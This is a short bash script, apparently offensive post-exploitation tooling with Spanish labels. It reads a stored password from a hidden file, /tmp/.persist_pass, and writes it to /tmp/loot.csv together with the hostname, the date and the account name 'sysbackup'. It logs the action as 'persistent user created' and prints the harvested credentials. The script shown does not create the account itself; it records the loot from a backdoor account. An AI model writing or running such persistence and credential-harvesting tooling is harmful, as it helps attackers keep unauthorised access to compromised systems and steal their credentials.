#!/bin/bash

HOST=$(hostname)
DATE=$(date)
USER="sysbackup"
PASS=$(cat /tmp/.persist_pass)

echo "fecha,hostname,usuario,password,accion" > /tmp/loot.csv
echo "$DATE,$HOST,$USER,$PASS,Usuario persistente creado" >> /tmp/loot.csv

echo "[+] loot.csv generado"
cat /tmp/loot.csv
